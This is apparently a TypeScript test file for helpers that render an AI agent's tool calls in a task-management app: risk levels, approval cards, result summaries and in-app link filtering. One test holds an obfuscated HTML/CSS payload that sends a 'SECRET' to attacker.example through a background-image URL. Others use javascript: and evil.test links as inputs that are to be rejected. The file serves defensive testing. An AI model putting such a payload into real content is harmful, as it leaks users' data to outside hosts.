import { describe, expect, test } from 'bun:test'
import { appPath, describeStep, fallbackRisk, notOpened, pageTargets, parseToolResult, resultLine, stepOutcome } from './toolSteps'

describe('fallbackRisk', () => {
  test('reads, changes and always-asked changes are told apart', () => {
    expect(fallbackRisk('list_projects')).toBe('read')
    expect(fallbackRisk('create_task')).toBe('write')
    expect(fallbackRisk('update_task')).toBe('dangerous')
    expect(fallbackRisk('update_doc')).toBe('dangerous')
    expect(fallbackRisk('delete_task')).toBe('dangerous')
  })
})

describe('describeStep', () => {
  test('a known tool gets its title and its title argument as the subject', () => {
    const view = describeStep('create_task', { title: 'Write the launch post', priority: 'high' })
    expect(view.title).toBe('Create task')
    expect(view.subject).toBe('Write the launch post')
    expect(view.risk).toBe('write')
    expect(view.fields).toEqual([
      { label: 'Title', value: 'Write the launch post' },
      { label: 'Priority', value: 'high' },
    ])
  })

  test('the server risk wins over the fallback', () => {
    expect(describeStep('create_task', {}, undefined, 'dangerous').risk).toBe('dangerous')
    expect(describeStep('create_task', {}, undefined, 'nonsense').risk).toBe('write')
  })

  test('an unknown tool reads as a sentence and empty arguments are left out', () => {
    const view = describeStep('list_task_cycles', { project: '', limit: null })
    expect(view.title).toBe('List task cycles')
    expect(view.fields).toEqual([])
    expect(describeStep('get_me', undefined).fields).toEqual([])
  })

  test('ids become the names the user knows', () => {
    const names = new Map([
      ['p-1', 'Website'],
      ['s-1', 'Todo'],
    ])
    const view = describeStep('create_task', { project_id: 'p-1', status_id: 's-1', title: 'x' }, names)
    expect(view.fields).toEqual([
      { label: 'Project', value: 'Website' },
      { label: 'Status', value: 'Todo' },
      { label: 'Title', value: 'x' },
    ])
  })

  test('bookkeeping and unnamed ids go under Details; what changes stays on the card', () => {
    const done = '0193a1b2-0000-7000-8000-000000000001'
    const view = describeStep('update_task', { task_id: '0193a1b2-0000-7000-8000-00000000abcd', expected_version: 5766222935801406, status_id: done }, new Map([[done, 'Done']]))
    expect(view.fields).toEqual([{ label: 'Status', value: 'Done' }])
    expect(view.details.map((field) => field.label)).toEqual(['Task id', 'Expected version'])
    expect(view.details.find((field) => field.label === 'Expected version')?.value).toBe('5766222935801406')
  })

  test('readable identifiers and text stay on the card', () => {
    const view = describeStep('create_comment', { task_id: 'LCH-12', body: 'Looks good' })
    expect(view.fields.map((field) => field.label)).toEqual(['Task id', 'Text'])
    expect(view.details).toEqual([])
  })

  test('a comment body is shown verbatim, fences and HTML included', () => {
    const body = "```\nflowchart TD\n  A[\"<span style='background-image:u\\72l(https:\\2f\\2f attacker.example/p.png?d=SECRET)'>status</span>\"] --> B\n```"
    expect(describeStep('create_comment', { task_id: 't1', body }).fields.find((field) => field.label === 'Text')?.value).toBe(body)
  })
})

describe('appPath', () => {
  test('only an in-app path or a same-origin link is a link', () => {
    expect(appPath('/tasks/ORB-1')).toBe('/tasks/ORB-1')
    expect(appPath('https://example.com/x')).toBeNull()
    expect(appPath('//example.com/x')).toBeNull()
    expect(appPath('javascript:alert(1)')).toBeNull()
    expect(appPath(undefined)).toBeNull()
  })
})

describe('results', () => {
  test('results arrive as JSON text', () => {
    expect(parseToolResult('{"url":"/docs"}')).toEqual({ url: '/docs' })
    expect(parseToolResult('plain')).toBe('plain')
  })

  test('a result becomes one short line', () => {
    expect(resultLine(undefined)).toBe('')
    expect(resultLine([1, 2, 3])).toBe('3 results')
    expect(resultLine([1])).toBe('1 result')
    expect(resultLine({ message: 'Created ORB-1' })).toBe('Created ORB-1')
    expect(resultLine({ other: 1 })).toBe('')
    expect(resultLine({ expired: true })).toBe('Expired, not done')
    expect(resultLine('x'.repeat(100)).length).toBe(81)
  })

  test('the outcome of a call', () => {
    const base = { status: { type: 'complete' } }
    expect(stepOutcome({ ...base, approval: {}, result: undefined })).toBe('waiting')
    expect(stepOutcome({ ...base, approval: { approved: false }, result: undefined })).toBe('declined')
    expect(stepOutcome({ ...base, result: undefined, status: { type: 'running' } })).toBe('running')
    expect(stepOutcome({ ...base, result: { id: 't1' } })).toBe('done')
    expect(stepOutcome({ ...base, result: { declined: true } })).toBe('declined')
    expect(stepOutcome({ ...base, result: { expired: true } })).toBe('skipped')
    expect(stepOutcome({ ...base, result: { error: 'no' } })).toBe('failed')
    expect(stepOutcome({ result: undefined, status: { type: 'incomplete', reason: 'cancelled' } })).toBe('skipped')
  })

  test('a page step with Follow along off is a link, not done', () => {
    expect(notOpened('navigate', { url: '/tasks/t1', opened: false })).toBe(true)
    expect(notOpened('navigate', { url: '/tasks/t1' })).toBe(false)
    expect(notOpened('create_task', { opened: false })).toBe(false)
  })

  test('page targets come only from server results with an in-app link', () => {
    const messages = [
      { role: 'user', content: [{ type: 'text' }] },
      {
        role: 'assistant',
        content: [
          { type: 'tool-call', toolName: 'create_task', toolCallId: 'a', result: '{"id":"t1"}' },
          { type: 'tool-call', toolName: 'navigate', toolCallId: 'n1', result: '{"url":"/tasks/t1?workspace=w"}' },
          { type: 'tool-call', toolName: 'navigate', toolCallId: 'n2', result: '{"url":"https://evil.test/x"}' },
          { type: 'tool-call', toolName: 'navigate', toolCallId: 'n3' },
          { type: 'tool-call', toolName: 'open_page', toolCallId: 'o1', result: '{"url":"/docs?workspace=w","opened":false}' },
        ],
      },
    ]
    expect(pageTargets(messages)).toEqual([
      { id: 'n1', path: '/tasks/t1?workspace=w' },
      { id: 'o1', path: '/docs?workspace=w' },
    ])
  })
})
